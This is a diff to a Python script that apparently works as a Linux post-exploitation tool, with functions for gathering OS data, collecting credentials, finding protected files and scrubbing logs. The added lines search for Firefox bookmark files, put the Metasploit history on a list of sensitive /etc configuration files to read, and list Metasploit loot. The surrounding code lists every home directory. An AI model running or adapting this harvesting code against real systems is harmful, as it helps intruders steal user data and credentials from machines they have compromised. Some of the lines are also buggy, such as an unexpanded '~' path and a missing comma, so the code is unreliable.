@@ -207,7 +207,10 @@ def Gather_OS():
    
    os.system("ls -alhR ~/ > CurrentUser.txt")
    os.system("ls -alhR /home > AllUsers.txt")
+   if os.path.exists(Home_Dir+"/.mozilla/") is True:
+       os.system("find "+Home_Dir+"/.mozilla -name bookmarks*.json > UsersBookmarks.txt")
    
+
    
 def GetCredentials():
     print("[+] Collecting user and system credentials....")
@@ -366,7 +369,7 @@ def FindProtect():
                 "/etc/apt/trusted.gpg", "/etc/nginx/nginx.conf", "/etc/shells", "/etc/gated.conf", "/etc/inetd.conf", "/etc/rpc",
                 "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf"
                 "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf", "/opt/lampp/etc/httpd.conf", "/etc/cups/cups.conf",
-                "/etc/exports", "/etc/fstab" ]
+                "/etc/exports", "/etc/fstab", "~/.msf4/history", ]
 
     for x in configs:
         if os.path.exists(x) is True:
@@ -386,6 +389,9 @@ def FindProtect():
             content = location + '\n'
             file.write(content)
             file.close()
+
+    if os.path.exists("~/.msf4/") is True:
+        os.system("ls -l ~/.msf/loot > MetasploitLoot.txt")
 
 def ScrubLog():  
   try:
